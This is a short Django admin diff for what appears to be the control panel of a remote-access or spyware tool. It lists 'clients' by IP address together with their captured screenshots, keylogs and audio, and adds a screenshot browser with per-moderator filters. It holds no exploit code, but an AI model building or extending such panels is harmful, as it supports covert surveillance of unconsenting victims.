@@ -23,7 +23,7 @@ class ModeratorAdmin(admin.ModelAdmin):
             'fields': ('password',),
         }),
     )
-    readonly_fields = ['username',]
+
 
 class ClientsAdmin(admin.ModelAdmin):
 
@@ -48,7 +48,7 @@ class ClientsAdmin(admin.ModelAdmin):
     list_display = ['identifier', 'ip_address', 'alias', 'screenshots', 'keylogs', 'audios', 'status', 'last_online', 'client_moderator']
     fieldsets = (
         (None, {
-            'fields': ('identifier', 'ip_address', 'alias', 'note', 'status', 'last_online')
+            'fields': ('moderator_id', 'identifier', 'ip_address', 'alias', 'note', 'status', 'last_online')
         }),
         ('Logs Count', {
             'classes': ('grp-collapse grp-closed',),
@@ -57,8 +57,14 @@ class ClientsAdmin(admin.ModelAdmin):
     )
     readonly_fields = ['identifier', 'ip_address', 'screenshots', 'keylogs', 'audios', 'status', 'last_online']
 
+
+class ScreenshotsAdmin(admin.ModelAdmin):
+    search_fields = ['client_id__alias', 'title_name', 'client_id__moderator_id__username']
+    list_filter = ['client_id__moderator_id__username', 'viewed', 'date']
+    list_display = ['path', 'title_name', 'date', 'viewed']
+
 admin.site.register(Moderators, ModeratorAdmin)
 admin.site.register(Clients, ClientsAdmin)
-admin.site.register(Screenshots)
+admin.site.register(Screenshots, ScreenshotsAdmin)
 admin.site.register(Keylogs)
 admin.site.register(Audios)
